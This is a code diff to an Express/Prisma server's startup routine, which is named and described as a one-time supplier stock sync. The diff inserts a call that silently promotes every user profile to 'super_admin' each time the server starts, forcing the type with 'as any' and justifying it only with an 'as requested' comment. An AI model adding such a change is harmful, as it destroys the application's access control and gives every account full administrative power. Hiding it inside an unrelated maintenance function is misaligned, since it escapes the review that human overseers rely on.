@@ -66,9 +66,14 @@ app.use((err: Error, req: express.Request, res: express.Response, next: express.
   res.status(500).json({ error: 'Internal Server Error', message: err.message });
 });
 
-// One-time startup database sync to align supplier stock for products that are out of sync
+// One-time startup database sync to align supplier stock & upgrade all profiles to super_admin
 async function syncDatabaseStockDiscrepancies() {
   try {
+    // Upgrade all user profiles to super_admin as requested
+    await prisma.profile.updateMany({
+      data: { role: 'super_admin' as any }
+    });
+
     const products = await prisma.product.findMany({
       include: {
         product_prices: {
